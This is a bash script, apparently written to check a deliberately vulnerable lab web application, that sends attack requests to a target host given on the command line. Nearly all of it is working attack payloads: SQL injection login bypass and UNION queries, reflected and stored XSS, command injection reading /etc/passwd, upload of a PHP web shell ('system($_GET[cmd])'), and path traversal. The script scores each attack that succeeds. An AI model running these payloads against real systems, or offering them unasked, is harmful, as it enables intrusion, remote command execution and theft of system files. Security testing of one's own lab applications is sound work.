#!/bin/bash


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-80}"
BASE_URL="http://${TARGET_HOST}"
if [ "$TARGET_PORT" != "80" ]; then
    BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"
fi

echo -e "${BLUE}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║           VULNERABILITY TESTING SCRIPT                        ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo -e "${YELLOW}Target: ${BASE_URL}${NC}\n"

TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

run_test() {
    local test_name="$1"
    local test_command="$2"
    local expected_pattern="$3"
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    echo -e "${BLUE}[TEST $TOTAL_TESTS]${NC} $test_name"
    
    result=$(eval "$test_command" 2>&1)
    
    if echo "$result" | grep -q "$expected_pattern"; then
        echo -e "${GREEN}✓ PASSED${NC}"
        PASSED_TESTS=$((PASSED_TESTS + 1))
        echo -e "${GREEN}Response: ${result:0:100}...${NC}\n"
    else
        echo -e "${RED}✗ FAILED${NC}"
        FAILED_TESTS=$((FAILED_TESTS + 1))
        echo -e "${RED}Response: ${result:0:200}${NC}\n"
    fi
}

echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}1. SQL INJECTION TESTS${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}\n"

run_test "SQL Injection - Auth Bypass (OR 1=1)" \
    "curl -s -X POST ${BASE_URL}/api/login -H 'Content-Type: application/json' -d '{\"username\": \"admin'\'' OR '\''1'\''='\''1\", \"password\": \"x\"}'" \
    "success.*true"

run_test "SQL Injection - User Enumeration" \
    "curl -s '${BASE_URL}/api/users?role=admin'\'' OR '\''1'\''='\''1'" \
    "users"

run_test "SQL Injection - UNION Based" \
    "curl -s '${BASE_URL}/api/users?role=admin'\'' UNION SELECT 1,2,3,4--'" \
    "users"

echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}2. CROSS-SITE SCRIPTING (XSS) TESTS${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}\n"

run_test "Reflected XSS - Script Tag" \
    "curl -s '${BASE_URL}/search?q=<script>alert(1)</script>'" \
    "<script>alert(1)</script>"

run_test "Reflected XSS - Image Onerror" \
    "curl -s '${BASE_URL}/search?q=<img src=x onerror=alert(1)>'" \
    "<img src=x onerror=alert(1)>"

run_test "Stored XSS - Comment Injection" \
    "curl -s -X POST ${BASE_URL}/api/comment -H 'Content-Type: application/json' -d '{\"username\": \"test\", \"comment\": \"<script>alert(1)</script>\"}'" \
    "success.*true"

echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}3. OS COMMAND INJECTION TESTS${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}\n"

run_test "Command Injection - Whoami" \
    "curl -s -X POST ${BASE_URL}/api/ping -H 'Content-Type: application/json' -d '{\"host\": \"127.0.0.1; whoami\"}'" \
    "root\|www-data\|app"

run_test "Command Injection - List Directory" \
    "curl -s -X POST ${BASE_URL}/api/ping -H 'Content-Type: application/json' -d '{\"host\": \"127.0.0.1; ls -la /\"}'" \
    "bin\|etc\|var"

run_test "Command Injection - Read /etc/passwd" \
    "curl -s -X POST ${BASE_URL}/api/ping -H 'Content-Type: application/json' -d '{\"host\": \"127.0.0.1; cat /etc/passwd\"}'" \
    "root:x:0:0"

run_test "System Command - Direct Execution" \
    "curl -s -X POST ${BASE_URL}/api/system -H 'Content-Type: application/json' -d '{\"command\": \"uname -a\"}'" \
    "Linux"

echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}4. FILE UPLOAD TESTS${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}\n"

echo "Test file content" > /tmp/test_upload.txt
run_test "File Upload - Text File" \
    "curl -s -X POST ${BASE_URL}/api/upload -F 'file=@/tmp/test_upload.txt'" \
    "success.*true"

echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
run_test "File Upload - PHP Shell" \
    "curl -s -X POST ${BASE_URL}/api/upload -F 'file=@/tmp/shell.php'" \
    "success.*true"

echo 'print("malicious")' > /tmp/malicious.py
run_test "File Upload - Python Script" \
    "curl -s -X POST ${BASE_URL}/api/upload -F 'file=@/tmp/malicious.py'" \
    "success.*true"

run_test "List Uploaded Files" \
    "curl -s ${BASE_URL}/api/uploads" \
    "uploads"

echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}5. ADDITIONAL SECURITY TESTS${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}\n"

run_test "Information Disclosure - Error Messages" \
    "curl -s '${BASE_URL}/api/users?role=admin'\'' AND 1=2 UNION SELECT 1,@@version,3,4--'" \
    "users\|error"

run_test "Path Traversal - File Access" \
    "curl -s '${BASE_URL}/uploads/../../../etc/passwd'" \
    "root\|error"

run_test "Health Check Endpoint" \
    "curl -s ${BASE_URL}/health" \
    "healthy"

rm -f /tmp/test_upload.txt /tmp/shell.php /tmp/malicious.py

echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}TEST SUMMARY${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}\n"

echo -e "Total Tests:  ${BLUE}${TOTAL_TESTS}${NC}"
echo -e "Passed:       ${GREEN}${PASSED_TESTS}${NC}"
echo -e "Failed:       ${RED}${FAILED_TESTS}${NC}"

if [ $FAILED_TESTS -eq 0 ]; then
    echo -e "\n${GREEN}✓ All vulnerabilities are exploitable!${NC}"
    exit 0
else
    echo -e "\n${RED}✗ Some tests failed. Check the application.${NC}"
    exit 1
fi
